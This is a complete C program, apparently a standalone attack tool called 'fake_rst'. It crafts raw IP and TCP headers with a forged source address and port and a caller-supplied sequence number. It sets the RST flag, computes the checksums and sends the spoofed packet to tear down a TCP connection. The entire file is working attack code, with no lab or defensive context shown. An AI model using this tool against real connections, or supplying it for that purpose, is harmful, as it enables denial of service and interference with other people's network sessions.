#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define PCKT_LEN 8192

//------------------------------------------------------------
// Checksum Helpers
//------------------------------------------------------------
unsigned short checksum(unsigned short *ptr, int nbytes)
{
    long sum = 0;
    unsigned short oddbyte;
    unsigned short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *) &oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    // fold 32-bit sum to 16 bits
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (unsigned short) ~sum;

    return answer;
}

//------------------------------------------------------------
// Pseudo Header for TCP checksum
//------------------------------------------------------------
struct pseudo_header {
    unsigned int src;
    unsigned int dst;
    unsigned char zero;
    unsigned char protocol;
    unsigned short tcp_len;
};

//------------------------------------------------------------
// MAIN
//------------------------------------------------------------
int main(int argc, char *argv[])
{
    // usage: ./fake_rst <src_ip> <src_port> <dst_ip> <dst_port> <seq>
    if (argc != 6) {
        fprintf(stderr,
                "usage: %s <src_ip> <src_port> <dst_ip> <dst_port> <seq>\n",
                argv[0]);
        exit(1);
    }

    const char *src_ip = argv[1];
    int src_port = atoi(argv[2]);
    const char *dst_ip = argv[3];
    int dst_port = atoi(argv[4]);
    unsigned int seq = strtoul(argv[5], NULL, 10);   // raw 32-bit seq

    // Raw socket at TCP layer
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sd < 0) {
        perror("socket");
        exit(1);
    }

    // We provide our own IP header
    int one = 1;
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt(IP_HDRINCL)");
        close(sd);
        exit(1);
    }

    char packet[PCKT_LEN];
    memset(packet, 0, sizeof(packet));

    struct iphdr  *ip  = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    //------------------------------------------------------------
    // Fill IP header
    //------------------------------------------------------------
    ip->ihl      = 5;              // 20-byte IP header
    ip->version  = 4;
    ip->tos      = 0;
    ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->id       = htons(54321);   // arbitrary
    ip->frag_off = 0;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_TCP;
    ip->check    = 0;              // filled after
    ip->saddr    = inet_addr(src_ip);
    ip->daddr    = inet_addr(dst_ip);

    //------------------------------------------------------------
    // Fill TCP header
    //------------------------------------------------------------
    tcp->source  = htons(src_port);
    tcp->dest    = htons(dst_port);
    tcp->seq     = htonl(seq);     // sequence we pass in
    tcp->ack_seq = 0;              // RST without ACK
    tcp->doff    = 5;              // 20-byte TCP header
    tcp->syn     = 0;
    tcp->ack     = 0;
    tcp->psh     = 0;
    tcp->fin     = 0;
    tcp->urg     = 0;
    tcp->rst     = 1;              // <-- important bit
    tcp->window  = htons(0);
    tcp->check   = 0;              // filled after
    tcp->urg_ptr = 0;

    //------------------------------------------------------------
    // TCP checksum (pseudo header + TCP header)
    //------------------------------------------------------------
    struct pseudo_header psh;
    psh.src      = ip->saddr;
    psh.dst      = ip->daddr;
    psh.zero     = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_len  = htons(sizeof(struct tcphdr));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char *pseudogram = malloc(psize);
    if (!pseudogram) {
        perror("malloc");
        close(sd);
        exit(1);
    }

    memcpy(pseudogram, &psh, sizeof(psh));
    memcpy(pseudogram + sizeof(psh), tcp, sizeof(struct tcphdr));

    tcp->check = checksum((unsigned short *)pseudogram, psize);
    free(pseudogram);

    //------------------------------------------------------------
    // IP checksum
    //------------------------------------------------------------
    ip->check = checksum((unsigned short *)packet, ip->ihl * 4);

    //------------------------------------------------------------
    // Send packet
    //------------------------------------------------------------
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(dst_port);  // not really used by raw IP
    sin.sin_addr.s_addr = ip->daddr;

    if (sendto(sd,
               packet,
               sizeof(struct iphdr) + sizeof(struct tcphdr),
               0,
               (struct sockaddr *)&sin,
               sizeof(sin)) < 0) {
        perror("sendto");
    } else {
        printf("Spoofed RST sent: %s:%d -> %s:%d  seq=%u\n",
               src_ip, src_port, dst_ip, dst_port, seq);
    }

    close(sd);
    return 0;
}
